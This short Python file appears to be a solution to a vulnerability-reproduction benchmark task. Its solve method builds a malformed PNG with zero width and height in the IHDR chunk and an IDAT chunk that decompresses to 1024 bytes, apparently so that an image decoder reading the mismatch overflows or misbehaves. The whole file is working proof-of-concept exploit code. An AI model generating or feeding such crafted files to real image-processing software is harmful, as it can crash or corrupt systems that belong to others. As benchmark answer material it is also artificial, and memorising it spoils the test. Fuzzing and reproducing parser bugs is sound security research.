import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # PNG signature
        png_sig = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk: width=0, height=0, bit depth=8, color type=2 (truecolor), compression=0, filter=0, interlace=0
        ihdr_data = b'\x00\x00\x00\x00\x00\x00\x00\x00\x08\x02\x00\x00\x00'
        ihdr_type = b'IHDR'
        ihdr_full = ihdr_type + ihdr_data
        crc = zlib.crc32(ihdr_full) & 0xffffffff
        ihdr_crc = crc.to_bytes(4, 'big')
        ihdr_chunk = b'\x00\x00\x00\x0d' + ihdr_full + ihdr_crc
        
        # IDAT chunk: compress some data to produce non-zero decompressed size
        uncompressed = b'\x00' * 1024  # Decompresses to 1024 bytes, but expected 0
        compressed = zlib.compress(uncompressed)
        idat_type = b'IDAT'
        idat_full = idat_type + compressed
        crc = zlib.crc32(idat_full) & 0xffffffff
        idat_crc = crc.to_bytes(4, 'big')
        idat_len = len(compressed).to_bytes(4, 'big')
        idat_chunk = idat_len + idat_full + idat_crc
        
        # IEND chunk
        iend_type = b'IEND'
        iend_full = iend_type
        crc = zlib.crc32(iend_full) & 0xffffffff
        iend_crc = crc.to_bytes(4, 'big')
        iend_chunk = b'\x00\x00\x00\x00' + iend_full + iend_crc
        
        poc = png_sig + ihdr_chunk + idat_chunk + iend_chunk
        return poc
